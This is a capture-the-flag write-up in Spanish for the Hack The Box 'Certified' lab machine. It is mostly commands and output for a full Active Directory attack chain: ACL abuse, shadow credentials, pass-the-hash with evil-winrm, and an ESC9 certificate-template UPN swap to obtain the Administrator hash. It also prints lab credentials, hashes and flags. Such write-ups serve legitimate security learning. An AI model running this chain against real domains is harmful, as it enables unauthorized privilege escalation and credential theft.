---
tags:
title: Certified - Medium (HTB)
permalink: /Certified-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introduccion

# Reconocimiento

As is common in `Windows` pentests, you will start the `Certified` box with credentials for the following account: Username: `judith.mader` Password: `judith09`

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49693,49722,49731 10.129.231.186
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 22:41 -03
Nmap scan report for 10.129.231.186
Host is up (0.67s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-05 08:43:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-05T08:44:53+00:00; +7h01m48s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-12-05T08:44:52+00:00; +7h01m48s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-12-05T08:44:55+00:00; +7h01m49s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-12-05T08:44:52+00:00; +7h01m49s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49731/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-12-05T08:44:15
|_  start_date: N/A
|_clock-skew: mean: 7h01m48s, deviation: 0s, median: 7h01m48s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.77 seconds
```

## RPC / Port 135 

Usando las credenciales iniciales me conecte al servicio `RPC` y enumere usuarios validos del dominio.

```bash
rpcclient -U "judith.mader%judith09" 10.129.231.186   
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[judith.mader] rid:[0x44f]
user:[management_svc] rid:[0x451]
user:[ca_operator] rid:[0x452]
user:[alexander.huges] rid:[0x641]
user:[harry.wilson] rid:[0x642]
user:[gregory.cameron] rid:[0x643]
```
### ACLs

Con las credenciales me recolecte toda la información del dominio con `rusthound`.

```bash
rusthound -d certified.htb -u 'judith.mader' -p 'judith09'
---------------------------------------------------
Initializing RustHound at 06:03:47 on 12/05/25
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2025-12-05T09:03:47Z INFO  rusthound] Verbosity level: Info
[2025-12-05T09:03:48Z INFO  rusthound::ldap] Connected to CERTIFIED.HTB Active Directory!
[2025-12-05T09:03:48Z INFO  rusthound::ldap] Starting data collection...
[2025-12-05T09:03:55Z INFO  rusthound::ldap] All data collected for NamingContext DC=certified,DC=htb
[2025-12-05T09:03:55Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2025-12-05T09:03:55Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
[2025-12-05T09:03:55Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2025-12-05T09:03:55Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2025-12-05T09:03:55Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] 10 users parsed!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] .//20251205060355_certified-htb_users.json created!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] 61 groups parsed!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] .//20251205060355_certified-htb_groups.json created!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] 1 computers parsed!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] .//20251205060355_certified-htb_computers.json created!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] 1 ous parsed!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] .//20251205060355_certified-htb_ous.json created!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] 1 domains parsed!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] .//20251205060355_certified-htb_domains.json created!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] 2 gpos parsed!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] .//20251205060355_certified-htb_gpos.json created!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] 21 containers parsed!
[2025-12-05T09:03:55Z INFO  rusthound::json::maker] .//20251205060355_certified-htb_containers.json created!

RustHound Enumeration Completed at 06:03:55 on 12/05/25! Happy Graphing!
```
### WriteOwner over Managment group

Y asi es como vi que `judith` tiene el privilegio `WriteOwner` sobre el grupo `Management`.

![image-center](/assets/images/{F04C09A4-A49F-4158-A627-84135CCC9B72}.png)

Para poder abusar de este permiso user `owneredit`.

```bash
impacket-owneredit -action write -new-owner 'judith.mader' -target 'management' certified.htb/judith.mader:judith09
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!

```
### Add member 

Después con `dacledit.py` cambie la `DACL (Discretionary Access Control Lists)` sobre el mismo grupo para poder añadir a `judith` al grupo luego.
```bash
 dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09' 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20251205-062356.bak
[*] DACL modified successfully!
```

Para agregar el usuario al grupo use `BloodyAD`.

```bash
bloodyAD -u judith.mader -p judith09 -d certified.htb --dc-ip 10.129.231.186 add groupMember MANAGEMENT judith.mader                                                          
[+] judith.mader added to MANAGEMENT
```
## Shell as management_svc

Después veo que el grupo Management tiene también el privilegio `GenericWrite` sobre el usuario `management_svc`, en donde los atacantes pueden modificar las membresías de grupo, los nombres de los principales de servicio o los scripts de inicio de sesión, lo que lleva al movimiento lateral o al dominio.

![image-center](/assets/images/{9911527C-3A5E-4246-9A66-3F935E5346CF}.png)
### Generate pfx
Para eso puedo usar `pywhisker` para poder solicitar un certificado a nombre de `management_svc`.

```bash
python3 pywhisker.py -d certified.htb -u judith.mader -p judith09 --target management_svc --action 'add'
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 1583f68f-21c4-dcf8-03cc-fe4a6aa84b0f
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: Lv8O9ZXC.pfx
[+] PFX exportiert nach: Lv8O9ZXC.pfx
[i] Passwort für PFX: 2VsMAPy6VysBmYVNpJ4K
[+] Saved PFX (#PKCS12) certificate & key at path: Lv8O9ZXC.pfx
[*] Must be used with password: 2VsMAPy6VysBmYVNpJ4K
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```
### Getting NTLM hash

Y ahora con `certipy` use el mismo para poder obtener el `TGT` de este usuario.

```bash
certipy-ad auth -pfx Lv8O9ZXC.pfx -dc-ip 10.129.231.186 -password 2VsMAPy6VysBmYVNpJ4K -username management_svc -domain certified.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

/usr/lib/python3/dist-packages/certipy/lib/certificate.py:662: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return pkcs12.load_key_and_certificates(pfx, password)[:-1]
[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
[*] Wrote credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Got hash for 'management_svc@certified.htb': aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584
```

Como dicho usuario es miembro del grupo `Remote Management Users` puedo conectarme al servicio de `WinRM`.

```powershell
evil-winrm -i certified.htb -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
<SNIP>
*Evil-WinRM* PS C:\Users\management_svc\Documents> cat ../desktop/user.txt
836ae38953503153ca864adfde215ebe
```

## Shell as nt authority\system.

Este usuario tiene el privilegio `GenericAll` sobre `ca_operator`.

![image-center](/assets/images/{02F50B9C-0520-4891-9CCC-DC382C09593F}.png)
### Change password

Por lo que con `pth-net` le cambie la `password` a este usuario.

```bash
pth-net rpc password "ca_operator" "newP@ssword2022" -U "certified.htb"/"management_svc"%"ffffffffffffffffffffffffffffffff":"a091c1832bcdd4677c28b5a6a1295584" -S "10.129.231.186"
```
## ADCS

Como dentro de la maquina no vi nada mas, enumere certificados vulnerables con `certipy` y con las credenciales de `ca_operator`.
### ESC9

Analizando el contenido del output, veo que el servicio de certificados, es vulnerable a `ESC9`.

```bash
certipy-ad find -u ca_operator@certified.htb -p 'newP@ssword2022' -dc-ip 10.129.231.186 -enabled -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
                                          NoSecurityExtension
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-05-13T15:48:52+00:00
    Template Last Modified              : 2024-05-13T15:55:20+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Full Control Principals         : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

>Con la manipulación `UPN` (en modo de compatibilidad o modo deshabilitado): Si un atacante tiene control sobre el atributo `userPrincipalName` de una cuenta (por ejemplo, a través del permiso `GenericWrite`) y esa cuenta puede inscribirse en la plantilla `ESC9`, el atacante puede cambiar temporalmente la `UPN` de esta cuenta de "víctima" para que coincida con el nombre de `sAMAccount` (o UPN deseado) de una cuenta `privilegiada` de destino (por ejemplo, un `administrador`).
### Impersonate administrator

Es así que con las credenciales del usuario `management_svc` cambio el `UPN` de `ca_operator` con el del usuario `Administrator`

```bash
 certipy-ad  account -u 'management_svc@certified.htb' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -dc-ip '10.129.231.186' -upn 'administrator' -user 'ca_operator' update 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
```
### Certificate by administrator

Y ya luego puedo solicitar el certificado para el usuario `ca_operator`, lo cual me deja un un certificado para el usuario `administrator` ya que lo `impersone` cambiándole el `UPN`.

```bash
certipy-ad req -u ca_operator -p newP@ssword2022 -ca certified-DC01-CA -template CertifiedAuthentication  -dc-ip '10.129.231.186'                  
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

### Auth fail
Ya luego puedo autenticarme con este certificado, pero veo en el output que usar el nombre de `ca_operator`, cuando en realidad debe ser para el usuario `administrator`.

```bash
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.231.186 -u ca_operator -domain certified.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[!] The provided username does not match the identity found in the certificate: 'ca_operator' - 'administrator'
Do you want to continue? (Y/n): t
[*] Using principal: 'ca_operator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_operator.ccache'
[*] Wrote credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Got hash for 'ca_operator@certified.htb': aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45
```
### Restore UPN

Para actualizar nuevamente el `UPN` de `ca_operator` use `account update`.

```bash
(root㉿zsln)-[/home/…/Desktop/zsln/htb/certified]
└─# certipy-ad  account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.254.76 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```
### TGT

Y ya luego al autenticarme pude obtener el `TGT` del usuario `administrator`.

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.254.76 -domain certified.htb                                                                           
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

### Shell

Y es así que ya pude proporcionar el `hash` para poder autenticarme con `evil-winrm`.

```powershell
evil-winrm -i certified.htb -u administrator -H '0d5b49608bbce1751f708748f67e2d34'                                   
<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
b7ae47d3ac0f7893ec986fd237f7e5c9
```

`~Happy Hacking.`